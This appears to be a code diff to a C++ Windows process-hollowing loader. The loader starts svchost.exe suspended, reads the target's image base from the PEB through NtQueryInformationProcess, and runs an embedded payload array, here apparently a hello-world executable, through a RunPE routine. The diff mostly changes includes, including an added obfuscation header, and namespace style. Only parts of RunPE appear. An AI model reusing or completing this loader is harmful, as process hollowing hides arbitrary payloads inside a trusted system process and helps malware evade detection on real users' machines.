@@ -1,8 +1,8 @@
-#include <windows.h>
-#include <iostream>
-#include <winternl.h>
-#include <string>
-#include "../bin/HelloWorldHex.h" // Include the embedded helloWorldPayload array
+#include "../includes/Obfuscate.h"
+#include "../includes/HelloWorldHex.h" // Include the embedded helloWorldPayload array
+
+
+using namespace std;
 
 typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
 
@@ -18,21 +18,21 @@ ProcessAddressInformation GetProcessAddressInformation(HANDLE hProcess) {
 
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) {
-        std::cerr << "[error] Failed to get handle for ntdll.dll.\n";
+        cerr << "[error] Failed to get handle for ntdll.dll.\n";
         return addressInfo;
     }
 
     typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
     auto NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
     if (!NtQueryInformationProcess) {
-        std::cerr << "[error] Failed to get NtQueryInformationProcess address.\n";
+        cerr << "[error] Failed to get NtQueryInformationProcess address.\n";
         return addressInfo;
     }
 
     PROCESS_BASIC_INFORMATION pbi;
     ULONG len;
     if (NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &len) != 0) {
-        std::cerr << "[error] Failed to get process basic information.\n";
+        cerr << "[error] Failed to get process basic information.\n";
         return addressInfo;
     }
 
@@ -42,7 +42,7 @@ ProcessAddressInformation GetProcessAddressInformation(HANDLE hProcess) {
     PVOID imageBaseAddress;
     SIZE_T bytesRead;
     if (!ReadProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + 0x10, &imageBaseAddress, sizeof(PVOID), &bytesRead)) {
-        std::cerr << "[error] Failed to read ImageBaseAddress from PEB.\n";
+        cerr << "[error] Failed to read ImageBaseAddress from PEB.\n";
         return addressInfo;
     }
 
@@ -69,7 +69,7 @@ bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
     // Retrieve base address from the target process
     ProcessAddressInformation addressInfo = GetProcessAddressInformation(hProcess);
     if (!addressInfo.lpProcessImageBaseAddress) {
-        std::cerr << "[error] Failed to get process image base address.\n";
+        cerr << "[error] Failed to get process image base address.\n";
         return false;
     }
 
@@ -138,13 +138,13 @@ int main() {
     STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi;
     if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
-        std::cerr << "[error] Failed to create target process. Error: " << GetLastError() << "\n";
+        cerr << "[error] Failed to create target process. Error: " << GetLastError() << "\n";
         return -1;
     }
 
     // Execute the process hollowing
-    if (!RunPE(pi.hProcess, pi.hThread, hello_world_exe_exe, sizeof(hello_world_exe_exe))) {
-        std::cerr << "[error] Process hollowing failed.\n";
+    if (!RunPE(pi.hProcess, pi.hThread, hello_world_exe, sizeof(hello_world_exe))) {
+        cerr << "[error] Process hollowing failed.\n";
         TerminateProcess(pi.hProcess, 0);
     }
 
